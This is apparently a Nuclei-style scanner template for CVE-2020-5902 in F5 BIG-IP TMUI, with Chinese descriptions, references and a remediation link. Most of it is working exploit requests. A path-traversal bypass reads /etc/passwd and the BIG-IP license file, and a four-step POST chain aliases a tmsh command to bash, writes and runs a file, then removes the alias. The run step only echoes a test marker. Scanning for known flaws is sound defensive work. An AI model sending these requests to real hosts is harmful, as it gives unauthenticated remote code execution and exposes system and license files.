id: CVE-2020-5902
info:
  name: F5 BIG-IP TMUI - Remote Code Execution
  author:
  - l0ne1y
  tags:
  - cve
  - cve2020
  - bigip
  - rce
  description: |-
    F5 BIG-IP TMUI 远程命令执行漏洞
    F5 BIG-IP是美国F5公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。

    F5 BIG-IP中存在安全漏洞。攻击者可利用该漏洞执行任意的系统命令、创建或删除文件，关闭服务/执行任意的Java代码，可能完全入侵系统。以下产品及版本受到影响：F5 BIG-IP 15.1.0版本，15.0.0版本，14.1.0版本至14.1.2版本，13.1.0版本至13.1.3版本，12.1.0版本至12.1.5版本，11.6.1版本至11.6.5版本。
  reference:
  - http://packetstormsecurity.com/files/158333/big-ip-tmui-remote-code-execution.html
  - http://packetstormsecurity.com/files/158334/big-ip-tmui-remote-code-execution.html
  - http://packetstormsecurity.com/files/158366/f5-big-ip-tmui-directory-traversal-file-upload-code-execution.html
  - http://packetstormsecurity.com/files/158414/checker-cve-2020-5902.html
  - http://packetstormsecurity.com/files/158581/f5-big-ip-13.1.3-build-0.0.6-local-file-inclusion.html
  - https://badpackets.net/over-3000-f5-big-ip-endpoints-vulnerable-to-cve-2020-5902/
  - https://github.com/critical-start/team-ares/tree/master/cve-2020-5902
  - https://support.f5.com/csp/article/k52145254
  - https://swarm.ptsecurity.com/rce-in-f5-big-ip/
  - https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/
  - https://www.kb.cert.org/vuls/id/290915
  - https://nvd.nist.gov/vuln/detail/cve-2020-5902
  severity: critical
  classification:
    cve-id:
    - cve-2020-5902
    cwe-id:
    - cwe-22
    - cwe-829
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    **官方修复方案**
    目前厂商发布了该软件11.x版本，12.x版本，13.x版本，14.x版本和15.1.0版本的修复措施，该软件15.0.0版本的修复措施暂未发布，详情请参考链接：
    https://support.f5.com/csp/article/K52145254
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: regex
    condition: or
    regex:
    - 'root:.*:0:0:'
    - BIG-IP release ([\d.]+)
    - '[a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{5}-[a-fA-F]{7}'
    - HSQL Database Engine Servlet
  matchers-condition: and
  path:
  - '{{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
  - '{{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release'
  - '{{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license'
  - '{{BaseURL}}/hsqldb%0a'
  method: GET
- matchers:
  - type: status
    status:
    - 200
  - type: word
    words:
    - h3ll0_w0Rld
  matchers-condition: and
  raw:
  - |
    POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1
    Host: {{Hostname}}

    command=create%20cli%20alias%20private%20list%20command%20bash
  - |
    POST /tmui/locallb/workspace/fileSave.jsp HTTP/1.1
    Host: {{Hostname}}

    fileName=%2Ftmp%2Fnonexistent&content=echo%20%27aDNsbDBfdzBSbGQK%27%20%7C%20base64%20-d
  - |
    POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1
    Host: {{Hostname}}

    command=list%20%2Ftmp%2Fnonexistent
  - |
    POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1
    Host: {{Hostname}}

    command=delete%20cli%20alias%20private%20list
